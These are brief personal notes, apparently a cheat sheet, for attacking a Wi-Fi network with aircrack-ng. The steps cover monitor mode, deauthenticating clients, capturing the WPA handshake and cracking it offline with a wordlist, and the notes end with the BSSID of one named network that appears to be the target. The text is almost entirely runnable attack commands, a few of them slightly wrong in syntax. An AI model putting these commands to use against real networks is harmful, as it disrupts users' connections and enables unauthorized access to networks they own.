# Putting the interface in monitor mode
1. `airmon-ng check kill`
2. `airmon-ng start <interface>`

# Using airodump
* `airodump <interface>` will show probes, APs, etc.
* `--band a` flag required for 5GHz Networks
* Find the MAC of the specific network we want to target, note for later

# Deauthing
* `aireplay-ng -0 5 -a <BSSID> <interface>` to send 5 deauths to all clients at a given WAP
* can be more targeted by passing `-c <MAC>` to hit a certain client

# Capturing Handshakes
* configure airodump to save traffic to a pcap
* deauthing forces clients to reauthenticate
* we can capture that handshake and attack it offline
* `airodump <interface> --bssid <BSSID> -w capture <interface>`

# Cracking
* aircrack-ng -w `<wordlist> <capture>`

# GiacobeGigablast
* BSSID: `B8:27:EB:E3:52:C8`
